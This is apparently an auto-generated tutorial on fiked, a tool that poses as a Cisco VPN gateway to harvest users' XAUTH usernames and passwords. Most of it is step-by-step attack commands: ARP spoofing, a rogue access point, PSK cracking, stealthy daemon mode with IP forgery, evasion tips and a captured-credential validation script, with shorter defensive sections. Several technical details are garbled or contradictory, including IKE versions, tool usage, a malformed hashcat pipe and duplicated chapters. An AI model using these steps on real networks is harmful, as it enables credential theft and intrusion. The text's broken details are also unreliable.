---
tool_name: "fiked"
display_name: "FakeIKEd (fiked)"
mitre_tactic: "collection"
mitre_tactic_id: "TA0009"
mitre_subcategory: "vpn_credential_capture"
install_command: "sudo apt install fiked"
version: "0.0.5"
github_repo: "https://www.roe.ch/FakeIKEd"
kali_tools_page: "https://www.kali.org/tools/fiked/"
difficulty_level: "advanced"
requires_root: true
gui_available: false
tags: ["vpn", "ike", "ipsec", "credential-capture", "cisco", "mitm", "xauth"]
related_tools: ["ike-scan", "strongswan", "charon", "scapy"]
---

# Fiked - Cisco VPN Credential Capture via Fake IKE Daemon

## Chapter 1: Introduction & Overview

### What is Fiked?

Fiked (FakeIKEd) is a fake IKE (Internet Key Exchange) daemon that impersonates a VPN gateway's IKE responder to capture XAUTH login credentials from Cisco VPN clients. It implements just enough of the IKE standards and Cisco extensions to attack commonly found insecure Cisco VPN PSK+XAUTH based IPsec authentication setups in a semi-man-in-the-middle attack scenario.

### History & Background

- **Created:** Roland Greilzer (roe.ch)
- **Based on:** vpnc (open-source Cisco VPN client)
- **Version:** 0.0.5
- **License:** Open source
- **Language:** C
- **Dependencies:** libgcrypt, libnet

Fiked exploits the fact that many Cisco VPN deployments use Pre-Shared Key (PSK) authentication combined with XAUTH (Extended Authentication). By impersonating the VPN gateway, Fiked can capture the second-factor credentials (username/password) that XAUTH provides after the initial IKE Phase 1 negotiation.

### When to Use This Tool

- **Penetration testing:** Assess VPN gateway security configurations
- **Red team engagements:** Capture VPN credentials from the network
- **Security audits:** Test IKE/XAUTH authentication resilience
- **Network assessments:** Identify vulnerable Cisco VPN configurations
- **CTF challenges:** VPN-related capture-the-flag challenges

### When NOT to Use This Tool

- Against VPN gateways without explicit authorization
- To intercept VPN traffic for unauthorized access
- Against certificate-based VPN authentication (not supported)
- Without understanding the legal implications of credential capture

### Legal and Ethical Considerations

- **Authorization mandatory** — capturing VPN credentials is a severe finding
- **PSK is a shared secret** — knowing it means all VPN users are compromised
- **XAUTH captures user credentials** — these provide direct VPN access
- **Document findings** — report the vulnerability, don't just capture credentials
- **Secure captured data** — VPN credentials provide network-level access

### Key Concepts

| Concept | Description |
|---------|-------------|
| **IKE** | Internet Key Exchange — key management protocol for IPsec VPNs |
| **XAUTH** | Extended Authentication — adds username/password after IKE Phase 1 |
| **PSK** | Pre-Shared Key — shared secret used in IKE authentication |
| **IKE Responder** | The VPN gateway side of the IKE negotiation |
| **IKE Initiator** | The VPN client side of the IKE negotiation |
| **Semi-MITM** | Fiked impersonates the gateway but doesn't fully intercept the tunnel |

---

## Chapter 2: Installation & Setup

### System Requirements

- **OS:** Linux (Kali Linux recommended)
- **Root access:** Required for raw socket operations and network manipulation
- **Network position:** Must be on the path between VPN client and gateway
- **Dependencies:** libgcrypt, libnet

### Installation Methods

#### Method 1: APT (Recommended)

```bash
sudo apt update
sudo apt install fiked
```

#### Method 2: Dependencies Installation

```bash
# Install required libraries
sudo apt install libgcrypt20-dev libnet1-dev

# Build from source
git clone https://gitlab.com/kalilinux/packages/fiked.git
cd fiked
make
sudo ./fiked
```

### Verify Installation

```bash
fiked --help
```

**Output:**
```
Usage: fiked [-rdqhV] -g gw -k id:psk [-k ..] [-u user] [-l file] [-L file]
    -r    use raw socket: forge ip src addr to match <gateway>
    -d    detach from tty and run as a daemon
    -q    be quiet, don't write anything to stdout
    -h    print help and exit
    -V    print version and exit
    -g gw    VPN gateway address to impersonate
    -k i:k    pre-shared key aka. group password
    -u user   drop privileges to unprivileged user account
    -l file   append results to credential log file
    -L file   verbose logging to file instead of stdout
```

### Network Prerequisites

```bash
# Identify the VPN gateway IP
# This is the IP that VPN clients connect to
# Usually visible in VPN client configuration

# Verify you can reach the gateway
ping <gateway_ip>

# Check network position (ARP spoofing may be needed)
arp -a | grep <gateway_ip>
```

---

## Chapter 3: Architecture & Operation

### Attack Flow

```
1. Attacker identifies VPN gateway IP address
2. Attacker discovers or brute-forces the PSK (Pre-Shared Key)
3. Fiked starts, impersonating the VPN gateway on the network
4. VPN client sends IKE Phase 1 (Main Mode) request
5. Fiked responds with fake IKE Phase 1 using the known PSK
6. IKE Phase 1 completes successfully
7. VPN client sends XAUTH request (username/password)
8. Fiked captures the XAUTH credentials
9. Fiked can optionally forward to real gateway (semi-MITM)
10. Credentials are logged to file
```

### MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Network Sniffing | T1040 | Capture network traffic |
| Man-in-the-Middle | T1557 | Intercept IKE negotiations |
| Credential Access | T1555 | Steal VPN credentials |
| Impersonation | T1036 | Fake VPN gateway |

### IKE Protocol Basics

**IKE Phase 1 (Main Mode):**
```
Initiator → Responder: SA, Nonce, Key Exchange, ID
Responder → Initiator: SA, Nonce, Key Exchange, ID
[Encrypted] Initiator → Responder: Hash
[Encrypted] Responder → Initiator: Hash
```

**XAUTH Exchange:**
```
Gateway → Client: XAUTH Request (type=1, username)
Client → Gateway: XAUTH Reply (username)
Gateway → Client: XAUTH Request (type=2, password)
Client → Gateway: XAUTH Reply (password)
Gateway → Client: XAUTH Result (success/fail)
```

### Limitations

- **PSK required:** Fiked must know the Pre-Shared Key to complete IKE Phase 1
- **Semi-MITM only:** Does not forward traffic to the real gateway (no tunnel forwarding)
- **XAUTH only:** Does not capture certificate-based authentication
- **Single gateway:** Designed for one gateway at a time
- **No tunnel:** After credential capture, no VPN tunnel is established

---

## Chapter 4: Command Reference

### Basic Operation

#### Capture Credentials from VPN Gateway

```bash
sudo fiked -g 192.168.1.1 -k MyGroup:MySecretPSK
```

**Explanation:** Impersonate the VPN gateway at 192.168.1.1 using the group name "MyGroup" and PSK "MySecretPSK". Captures XAUTH credentials from connecting clients.

#### Log to File

```bash
sudo fiked -g 192.168.1.1 -k MyGroup:MySecretPSK -l vpn_creds.log
```

**Explanation:** Append all captured credentials to a log file for later analysis.

#### Run as Daemon

```bash
sudo fiked -g 192.168.1.1 -k MyGroup:MySecretPSK -d -q -l vpn_creds.log
```

**Explanation:** Detach from terminal, run silently in background, log to file.

#### Verbose Logging

```bash
sudo fiked -g 192.168.1.1 -k MyGroup:MySecretPSK -L verbose.log
```

**Explanation:** Write detailed IKE negotiation logs to a file for debugging.

#### Use Raw Socket (IP Forgery)

```bash
sudo fiked -r -g 192.168.1.1 -k MyGroup:MySecretPSK
```

**Explanation:** Use raw socket to forge source IP address to match the gateway, making the spoofing more convincing.

#### Drop Privileges

```bash
sudo fiked -g 192.168.1.1 -k MyGroup:MySecretPSK -u nobody
```

**Explanation:** After binding to privileged ports, drop to the 'nobody' user for reduced attack surface.

### Multiple Group Keys

```bash
sudo fiked -g 192.168.1.1 -k Group1:PSK1 -k Group2:PSK2 -k Default:SharedSecret
```

**Explanation:** Support multiple group names and PSKs. Fiked tries each during negotiation.

### Complete Flags Reference

| Flag | Description | Example |
|------|-------------|---------|
| `-g` | VPN gateway IP to impersonate | `-g 192.168.1.1` |
| `-k` | Group ID:PSK pair | `-k MyGroup:MySecret` |
| `-r` | Use raw socket (IP spoofing) | `-r` |
| `-d` | Daemon mode | `-d` |
| `-q` | Quiet mode | `-q` |
| `-u` | Drop to user after startup | `-u nobody` |
| `-l` | Credential log file | `-l creds.log` |
| `-L` | Verbose log file | `-L debug.log` |
| `-h` | Print help | `-h` |
| `-V` | Print version | `-V` |

---

## Chapter 5: Advanced Attack Scenarios

### Scenario 1: Capturing VPN Credentials via ARP Spoofing

**Setup:**

```bash
# Step 1: ARP spoof to position as MITM
sudo arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &
# (spoof to VPN client that you are the gateway)

# Step 2: Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Step 3: Start Fiked
sudo fiked -g 192.168.1.1 -k Corporate:VPNSecret -l vpn_creds.log
```

**Attack Flow:**
1. ARP spoofing redirects VPN client traffic through attacker
2. Fiked intercepts IKE negotiations destined for the gateway
3. XAUTH credentials are captured
4. VPN client thinks it connected successfully (may fail or succeed depending on configuration)

### Scenario 2: Internal Network Assessment

```bash
# Step 1: Discover VPN gateway
nmap -sU -p 500 192.168.1.0/24

# Step 2: Identify IKE configuration
ike-scan -M 192.168.1.1

# Step 3: Test PSK (if known from configuration review)
sudo fiked -g 192.168.1.1 -k KnownGroup:KnownPSK -l discovered.log
```

**Discovery Notes:**
- Port 500/UDP is the standard IKE port
- ike-scan reveals vendor ID, group name, and authentication methods
- If PSK is known from documentation/previous assessment, use it directly

### Scenario 3: Credential Harvesting from Legacy VPN

```bash
# Many organizations run legacy Cisco VPN with PSK+XAUTH
# If PSK is shared across the organization, capturing it compromises all users

sudo fiked -g 10.0.0.1 -k "CorpVPN:LegacyPSK123" \
  -l "vpn_audit_$(date +%Y%m%d).log" \
  -L "vpn_verbose_$(date +%Y%m%d).log"
```

**Key Insight:** A single captured PSK can be used to set up Fiked permanently, capturing all VPN authentication attempts.

---

## Chapter 6: Detection & Evasion

### Detection Signatures

**Network Detection:**
- IKE negotiations from unexpected MAC addresses
- Duplicate gateway responses (real + fake)
- IKE Phase 1 failures after successful negotiation
- XAUTH responses going to non-gateway IPs

**IKE-Specific Indicators:**
- IKE_SA_INIT from multiple sources for the same gateway
- Unexpected IKE vendor IDs
- XAUTH responses captured in plaintext (should be encrypted after Phase 1)

**Snort/Suricata Rules:**

```
# Detect IKE from non-gateway sources
alert udp any any -> 192.168.1.1 500 (msg:"IKE from non-gateway"; \
  content:"|00 00 00 00|"; sid:1000001; rev:1;)
```

### Evasion Techniques

1. **Raw Socket Mode:** Forge source IP to match the real gateway (`-r` flag)
2. **Quiet Mode:** No console output (`-q` flag)
3. **Daemon Mode:** Run in background (`-d` flag)
4. **Minimal Footprint:** Log only credentials, not full negotiations
5. **Timing:** Capture during business hours when VPN usage is high

### Blue Team Countermeasures

- **Certificate-based authentication:** Replace PSK with certificate-based IKE
- **IKEv2 with EAP:** Use IKEv2 with EAP-TLS for stronger authentication
- **Network segmentation:** Isolate VPN traffic on dedicated VLANs
- **MAC address filtering:** Allow only known client MACs
- **ARP inspection:** Implement Dynamic ARP Inspection (DAI) on switches
- **VPN monitoring:** Alert on duplicate IKE negotiations

---

## Chapter 7: Integration with Other Tools

### ike-scan Integration

```bash
# Step 1: Discover and enumerate the VPN gateway
ike-scan -M -P -v 192.168.1.1

# Step 2: Extract PSK (if possible) or use known PSK
ike-scan --pskcrack=psk.txt 192.168.1.1

# Step 3: Use captured PSK with Fiked
sudo fiked -g 192.168.1.1 -k GroupName:ExtractedPSK -l creds.log
```

### Scapy Integration

```bash
# Custom IKE packet analysis with Scapy
python3 -c "
from scapy.all import *
# Read captured IKE packets
packets = rdpcap('ike_capture.pcap')
for pkt in packets:
    if pkt.haslayer(ISAKMP):
        print(pkt[ISAKMP].summary())
"
```

### Log Analysis

```bash
# Parse Fiked credential log
cat vpn_creds.log | grep -E "^(XAUTH|Username|Password)"

# Export to CSV
awk -F'[: ]' '{print $2","$4}' vpn_creds.log > vpn_creds.csv
```

### Credential Validation

```bash
# After capturing credentials, test them
# Using vpnc (Cisco VPN client)
echo "Group: CorpVPN
Username: captured_user
Password: captured_pass
IPSec gateway: 192.168.1.1
IPSec ID: CorpVPN
IPSec secret: captured_psk" > /tmp/vpn_config.txt

vpnc /tmp/vpn_config.txt
```

---

## Chapter 8: Troubleshooting

### Common Issues

**Issue: Cannot bind to IKE port**

```bash
# Check if port 500 is in use
sudo ss -lunp | grep :500

# Kill existing IKE services
sudo systemctl stop strongswan
sudo systemctl stop charon

# Or use a different port and redirect
sudo iptables -t nat -A PREROUTING -p udp --dport 500 -j REDIRECT --to-port 5000
```

**Issue: IKE negotiation fails**

```bash
# Verify PSK is correct
# Test with vpnc using the same credentials
# Check for IKE version mismatch (IKEv1 vs IKEv2)
ike-scan -M 192.168.1.1

# Fiked only supports IKEv1, not IKEv2
# If target uses IKEv2, Fiked will not work
```

**Issue: XAUTH not captured**

```bash
# Enable verbose logging
sudo fiked -g 192.168.1.1 -k Group:PSK -L debug.log

# Check if XAUTH is actually used
# Some VPN configs skip XAUTH after PSK
ike-scan -P 192.168.1.1

# Verify network position - are you actually intercepting traffic?
sudo tcpdump -i eth0 udp port 500 -c 10
```

**Issue: Raw socket errors**

```bash
# Raw socket requires root
sudo fiked -r -g 192.168.1.1 -k Group:PSK

# Check capabilities
getcap /usr/bin/fiked
# Should show: cap_net_raw,cap_net_admin=eip
```

### Debug Mode

```bash
# Full verbose output
sudo fiked -g 192.168.1.1 -k Group:PSK -L /tmp/fiked_debug.log

# Review the log
tail -f /tmp/fiked_debug.log

# Look for IKE negotiation details
grep -i "SA\|NONCE\|KEY\|XAUTH" /tmp/fiked_debug.log
```

---

## Chapter 9: PSK Discovery Techniques

### Dictionary Attack on PSK

```bash
# Use ike-scan with pskcrack to recover PSK
# Step 1: Capture IKE negotiation
ike-scan --pskcrack=psk_hash.txt -M 192.168.1.1

# Step 2: Crack PSK with pskcrack
pskcrack -m 0 -b 5 psk_hash.txt /usr/share/wordlists/rockyou.txt

# Or use hashcat for GPU-accelerated cracking
# Convert to hashcat format
ike-scan --pskcrack=- 192.168.1.1 | hashcat -m 5400 -a 0 wordlist.txt

# Step 3: Use recovered PSK with fiked
sudo fiked -g 192.168.1.1 -k GroupName:recovered_psk -l creds.log
```

### PSK from Configuration Review

```bash
# Common PSK locations in Cisco configurations
# - Group password in VPN client profiles (.pcf files)
# - Shared secret in router configs
# - Default PSKs in documentation

# Search for PSK in configuration files
find / -name "*.pcf" -exec grep -l "GroupPwd\|SharedKey" {} \; 2>/dev/null

# Extract PSK from .pcf files (Cisco VPN client)
grep -A1 "GroupPwd" *.pcf
```

### PSK from Memory Dump

```bash
# If the gateway is compromised, extract PSK from memory
# Using Volatility for memory forensics
volatility -f gateway_memory.dump --profile=Win7SP1x64 netscan
volatility -f gateway_memory.dump --profile=Win7SP1x64 procdump -p isakmpd

# Analyze binary for PSK strings
strings isakmpd.exe | grep -i "group\|password\|secret\|psk"
```

---

## Chapter 10: IKE Protocol Deep Dive

### IKEv1 vs IKEv2

| Feature | IKEv1 | IKEv2 |
|---------|-------|-------|
| Fiked Support | Yes | No |
| Authentication | PSK, Cert, XAuth | EAP, Cert, PSK |
| Nat Traversal | NAT-T | Built-in |
| MOBIKE | No | Yes |
| Security | Weaker | Stronger |
| RFC | 2409 | 7296 |

### IKE Phase 1 Details

```
Main Mode (6 messages):
1. Initiator → Responder: SA (proposals)
2. Responder → Initiator: SA (chosen)
3. Initiator → Responder: Nonce + Key Exchange
4. Responder → Initiator: Nonce + Key Exchange
5. Initiator → Responder: ID + Hash (encrypted)
6. Responder → Initiator: ID + Hash (encrypted)

Aggressive Mode (3 messages):
1. Initiator → Responder: SA + Nonce + Key Exchange + ID
2. Responder → Initiator: SA + Nonce + Key Exchange + ID + Hash
3. Initiator → Responder: Hash (encrypted)
```

### XAUTH Exchange Details

```
After IKE Phase 1 completes:
1. Gateway → Client: XAUTH Request (type=1)
   - Includes: protocol, type, username field
2. Client → Gateway: XAUTH Reply (type=1)
   - Includes: username
3. Gateway → Client: XAUTH Request (type=2)
   - Includes: password field
4. Client → Gateway: XAUTH Reply (type=2)
   - Includes: password
5. Gateway → Client: XAUTH Result
   - 1 = ACK (success), 16 = NAK (failure)

Fiked captures steps 2 and 4 for credentials.
```

### Cisco Group Authentication

```bash
# Cisco VPN clients use group authentication
# The group name and PSK are shared among all users

# Find group names from network capture
ike-scan -M -P 192.168.1.1 2>&1 | grep "IDii\|VID"

# Common default group names
# - "test"
# - "default"
# - "cisco"
# - "vpn"
# - Company name variations

# Try multiple group names
sudo fiked -g 192.168.1.1 \
  -k default:password123 \
  -k cisco:cisco123 \
  -k test:test123 \
  -k corp:corppassword \
  -l multi_group.log
```

---

## Chapter 11: Advanced Network Positioning

### VPN Traffic Redirection

```bash
# Redirect VPN client traffic through attacker
# Step 1: Identify VPN client and gateway IPs
sudo tcpdump -i eth0 udp port 500 -nn | head -20

# Step 2: ARP spoof between client and gateway
sudo arpspoof -i eth0 -t <client_ip> <gateway_ip> &
sudo arpspoof -i eth0 -t <gateway_ip> <client_ip> &

# Step 3: Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Step 4: Start Fiked
sudo fiked -r -g <gateway_ip> -k GroupName:PSK -l vpn_creds.log

# Step 5: Monitor for VPN connections
sudo tcpdump -i eth0 udp port 500 -nn -w vpn_traffic.pcap
```

### Wireless VPN Interception

```bash
# Target remote workers connecting via VPN from WiFi
# Step 1: Create rogue AP matching target network
wifipumpkin3 -i wlan0 -m "ssid=OfficeWiFi;channel=6"

# Step 2: Capture VPN traffic from wireless clients
sudo tcpdump -i wlan0 udp port 500 or udp port 4500 -nn -w wifi_vpn.pcap

# Step 3: ARP spoof if on same LAN
sudo arpspoof -i eth0 -t <vpn_client> <gateway> &

# Step 4: Start Fiked
sudo fiked -r -g <gateway_ip> -k VPNGroup:SharedSecret -l wifi_vpn.log
```

### Split Tunneling Attack

```bash
# Many VPN configurations use split tunneling
# Only traffic to the corporate network goes through VPN
# Internet traffic goes directly

# Identify split tunnel configuration
# Look for:
# - Route additions after VPN connect
# - DNS configuration changes
# - Split exclude/include networks

# Capture traffic on both paths
sudo tcpdump -i eth0 -w corp_traffic.pcap "net 10.0.0.0/8"
sudo tcpdump -i eth0 -w internet_traffic.pcap "not net 10.0.0.0/8"

# Fiked targets the IKE negotiation path (always through gateway)
sudo fiked -r -g 10.0.0.1 -k CorpVPN:PSK123 -l split_tunnel.log
```

---

## Chapter 12: Detection and Defense

### Detection Signatures

**IKE-Specific Detection:**
```
# Snort rule for duplicate IKE negotiation
alert udp any any -> any 500 (
  msg:"IKE from duplicate source";
  content:"|00 00 00 00 00 00 00 00|";
  threshold:type both, track by_src, count 3, seconds 60;
  sid:1000001; rev:2;
)

# Suricata rule for IKE from non-gateway MAC
alert udp any 500 -> any 500 (
  msg:"IKE response from unexpected MAC";
  flow:to_server;
  threshold:type both, track by_src, count 5, seconds 10;
  sid:1000002; rev:1;
)
```

**Network Monitoring:**
```bash
# Monitor for duplicate IKE negotiations
sudo tcpdump -i eth0 udp port 500 -nn -l | \
  awk '{print $3}' | sort | uniq -d | \
  while read src; do
    echo "[!] Duplicate IKE source detected: $src"
  done

# Monitor for XAUTH in plaintext
sudo tcpdump -i eth0 udp port 500 -A | grep -i "xauth\|username\|password"
```

### Blue Team Countermeasures

```bash
# 1. Certificate-based authentication (eliminates PSK)
# Configure on gateway:
# crypto ikev2 proposalNewProposal
#  encryption aes-gcm-256
#  prf sha512
#  group 21

# 2. IKEv2 with EAP-TLS (mutual certificate auth)
# Requires RADIUS server + certificates on clients

# 3. Network segmentation
# Isolate VPN gateway on dedicated VLAN
# Restrict IKE traffic to known clients

# 4. MAC address filtering
# Allow only known client MACs on VPN gateway

# 5. Dynamic ARP Inspection (DAI)
# On Cisco switches:
# ip arp inspection vlan 10
# ip arp inspection validate src-mac dst-mac ip

# 6. VPN monitoring and alerting
# Log all IKE negotiations
# Alert on failures or duplicates
# Monitor for credential reuse
```

---

## Chapter 13: Integration with Other Tools

### Scapy IKE Packet Crafting

```python
#!/usr/bin/env python3
"""Custom IKE packet generation with Scapy"""
from scapy.all import *

# Craft IKE_SA_INIT request
ike_init = (
    IP(dst="192.168.1.1") /
    UDP(sport=500, dport=500) /
    ISAKMP() /
    ISAKMP_payload_SA(proposals=[
        ISAKMP_payload_Proposal(
            proposal=1,
            proto=ISAKMP_PROTO_ISAKMP,
            transforms=[
                ISAKMP_payload_Transform(
                    transform=1,
                    TransformID=KEY_IKE,
                    SA_lifetime=3600,
                    Encryption_Algorithm=ENCR_AES_CBC,
                    Hash_Algorithm=HASH_SHA256,
                    Group_Description=GROUP_MODP2048,
                )
            ]
        )
    ])
)

send(ike_init)
```

### Metasploit Integration

```bash
# Use Metasploit for VPN enumeration
msfconsole -q

# Scan for VPN gateways
use auxiliary/scanner/ike/ike_version
set RHOSTS 192.168.1.0/24
run

# After capturing credentials with Fiked
# Use them for VPN access
use auxiliary/scanner/ftp/ftp_login
```

### Credential Validation Script

```bash
#!/bin/bash
# validate_vpn_creds.sh - Validate captured VPN credentials
GATEWAY="192.168.1.1"
GROUP="CapturedGroup"
PSK="CapturedPSK"
USERNAME="CapturedUser"
PASSWORD="CapturedPass"

# Create temporary VPN config
cat > /tmp/vpn_test.conf << EOF
IPSec gateway $GATEWAY
IPSec ID $GROUP
IPSec secret $PSK
Xauth username $USERNAME
Xauth password $PASSWORD
EOF

# Test connection
timeout 10 vpnc --no-detach /tmp/vpn_test.conf 2>&1
RESULT=$?

if [ $RESULT -eq 0 ]; then
    echo "[+] VPN credentials are valid!"
    # Disconnect
    vpnc-disconnect 2>/dev/null
else
    echo "[-] VPN connection failed (code: $RESULT)"
fi

rm -f /tmp/vpn_test.conf
```

---

## Resources

- **Homepage:** https://www.roe.ch/FakeIKEd
- **Kali Documentation:** https://www.kali.org/tools/fiked/
- **ike-scan:** https://github.com/royhills/ike-scan
- **vpnc:** https://www.unix-ag.org/vpn/vpnc/
- **strongSwan:** https://www.strongswan.org
- **IPsec RFC 7296:** https://tools.ietf.org/html/rfc7296
- **IKE Protocol Analysis:** https://www.wireshark.org/docs/protocols/ike.html
- **RFC 2409 (IKEv1):** https://tools.ietf.org/html/rfc2409
- **NIST SP 800-77:** https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-77r1.pdf
